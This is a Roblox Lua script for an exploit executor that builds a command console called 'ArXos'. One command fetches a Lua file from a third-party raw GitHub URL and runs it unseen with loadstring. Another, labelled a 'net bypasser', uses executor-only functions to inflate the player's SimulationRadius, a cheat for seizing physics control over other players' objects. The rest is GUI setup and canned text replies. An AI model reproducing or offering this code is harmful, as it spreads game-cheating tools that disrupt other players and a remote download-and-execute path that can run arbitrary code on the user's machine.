local stuffe = Instance.new("ScreenGui")
local JustMain = Instance.new("Frame")
local Command = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local UICorner_2 = Instance.new("UICorner")
local CommandBar = Instance.new("TextBox")
local UICorner_3 = Instance.new("UICorner")
local logs = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local command_logged = Instance.new("TextLabel")
local UIListLayout = Instance.new("UIListLayout")
local exec = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")

--Properties:

stuffe.Name = "stuffe"
stuffe.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
stuffe.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

JustMain.Name = "JustMain"
JustMain.Parent = stuffe
JustMain.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
JustMain.BorderSizePixel = 0
JustMain.Position = UDim2.new(0.0750390813, 0, 0.216666669, 0)
JustMain.Size = UDim2.new(0, 504, 0, 229)

Command.Name = "/Command"
Command.Parent = JustMain
Command.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Command.BackgroundTransparency = 0.650
Command.Position = UDim2.new(0.0112721277, 0, 0.876068354, 0)
Command.Size = UDim2.new(0, 16, 0, 25)
Command.Font = Enum.Font.SourceSans
Command.Text = "/"
Command.TextColor3 = Color3.fromRGB(255, 151, 32)
Command.TextSize = 14.000
Command.TextStrokeColor3 = Color3.fromRGB(255, 139, 23)

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = Command

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = JustMain

CommandBar.Name = "CommandBar"
CommandBar.Parent = JustMain
CommandBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.BackgroundTransparency = 0.650
CommandBar.Position = UDim2.new(0.0430181585, 0, 0.876068354, 0)
CommandBar.Size = UDim2.new(0, 430, 0, 25)
CommandBar.Font = Enum.Font.SourceSans
CommandBar.PlaceholderText = "use help for more info."
CommandBar.Text = ""
CommandBar.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.TextSize = 14.000
CommandBar.TextXAlignment = Enum.TextXAlignment.Left

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = CommandBar

logs.Name = "logs"
logs.Parent = JustMain
logs.BackgroundColor3 = Color3.fromRGB(255, 151, 32)
logs.BackgroundTransparency = 0.650
logs.Position = UDim2.new(0.0112721277, 0, 0.0311472528, 0)
logs.Size = UDim2.new(0, 493, 0, 189)

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = logs

command_logged.Name = "command_logged"
command_logged.Parent = logs
command_logged.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
command_logged.BackgroundTransparency = 1.000
command_logged.Size = UDim2.new(0, 483, 0, 168)
command_logged.Font = Enum.Font.Code
command_logged.Text = "command_logged"
command_logged.TextColor3 = Color3.fromRGB(255, 255, 255)
command_logged.TextSize = 15.000
command_logged.TextWrapped = true
command_logged.TextXAlignment = Enum.TextXAlignment.Left
command_logged.TextYAlignment = Enum.TextYAlignment.Top

UIListLayout.Parent = logs
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

exec.Name = "exec"
exec.Parent = JustMain
exec.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
exec.BackgroundTransparency = 0.650
exec.Position = UDim2.new(0.909674108, 0, 0.876068354, 0)
exec.Size = UDim2.new(0, 39, 0, 25)
exec.Font = Enum.Font.SourceSans
exec.Text = "EXECUTE"
exec.TextColor3 = Color3.fromRGB(232, 151, 10)
exec.TextScaled = true
exec.TextSize = 14.000
exec.TextWrapped = true

UICorner_5.CornerRadius = UDim.new(0, 4)
UICorner_5.Parent = exec

---------------------------------------------------------------
local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
local userInout = game:GetService("UserInputService")


bind = "q"
command_logged.Text = "Welcome "..plr.Name..". Use the command help to get INFO."


JustMain.Visible = true


exec.MouseButton1Down:connect(function()
	if CommandBar.Text == "help" then
		command_logged.Text = "Welcome to ArXos. ARCU console, Uses axnoil lenguage. \nTo get all the commands type in the console cmds. \nActually we are working for new updates and a continued SCRIPT for our Community. \n\n\nTo get all the information of `axnoil lenguage or scripting lenguage.` please got to the wiki of GitHub"
		
	elseif CommandBar.Text == "exec_print_id" then
		command_logged.Text = "Printing id....."
		wait(2)
		command_logged.Text = "Printed. Press F9"
		local id =  game.PlaceId
		print(id)
	elseif CommandBar.Text == "exec_map_id_exec_admin-cannot_localfalse print_ID" then
		print("OK")
	elseif CommandBar.Text == "exec_map_id_exec_admin-cannot_localfalse print_ID true" then
		print("OK")
		command_logged.Text = "Printed. Press F9"
		
	elseif CommandBar.Text == "exec_axros_scriptFinder" then
		command_logged.Text = "Executed."
		if syn then request = syn.request end
		local req = request({
			Url = 'https://raw.githubusercontent.com/pq786/nsfsg-git/main/lol.lua'
		})
		loadstring(req.Body)()
		
	elseif CommandBar.Text == "update" then
		command_logged.Text = "Last Update was in 3/2/22 at 17:49. \nVersion Name: urquinoil \nVersion: 1.1.2"
		
	elseif CommandBar.Text == "mongday-exec" then
		command_logged.Text = "mongday SHILD. Executed."
		
	elseif CommandBar.Text == "arxos_dl.draggable true" then
		command_logged.Text = "Draggable was set to true."	
		JustMain.Draggable = true
	elseif CommandBar.Text == "arxos_dl.draggable false" then
		command_logged.Text = "Draggable was set to false."	
		JustMain.Draggable = false
	elseif CommandBar.Text == "close" then
		command_logged.Text = "Closing....."
		wait(2)
		command_logged.Text = "Bye Bye! "..plr.Name..". We are making our thinks better for you!"
		wait(2)
		JustMain.Visible = false
	elseif CommandBar.Text == "cmds" then
		command_logged.Text = "Welcome to ArXos. ARCU Console Commands, Your commands: \n\n exec_ : Execute a primal script from our lenguage \n negal_ : Execute a new primal SECOND Script from vars. \n unk. : Unk library commands. \n arxos_dl : arxsDl librarys."
		
	elseif CommandBar.Text == "exec - help" then
		command_logged.Text = "Exec Help Function: \n\n Exec works for any game, you can say `exec_dahood_bypass` or more games \n\n Only supported games can be executed by this command."

	elseif CommandBar.Text == "exec_test" then
		command_logged.Text = "exec_test Executed. Works correctly."
		
	elseif CommandBar.Text == "unk.execEval" then
		command_logged.Text = "ExecalEval executed"
	elseif CommandBar.Text == "negal_net.unk" then
		command_logged.Text = "We are executing the net bypasser. Wait a moment"
		wait(2)
		command_logged.Text = "We are executing the net bypasser. Wait a moment \nExecuted"
		game["Run Service"].RenderStepped:connect(
			function()
				setscriptable(game.Players.LocalPlayer, "SimulationRadius", true)
				game.Players.LocalPlayer.SimulationRadius = math.huge * math.huge, math.huge * math.huge * 1 / 0 * 1 / 0 * 1 / 0 * 1 / 0 * 1 / 0
			end
		)

		local LocalPlayer = game:GetService("Players").LocalPlayer
		LocalPlayer.SimulationRadiusChanged:Connect(function(radius)
			radius = 9e9
			return radius
		end)
		print(gethiddenproperty(game.Players.LocalPlayer, "SimulationRadius"))
		command_logged.Text = "We are executing the net bypasser. Wait a moment \nExecuted \n\n Check the F9 loaded!"
	elseif CommandBar.Text then
		command_logged.Text = "No command found. Please execute help to get info and the commands. \nError: -17"
	end
end)
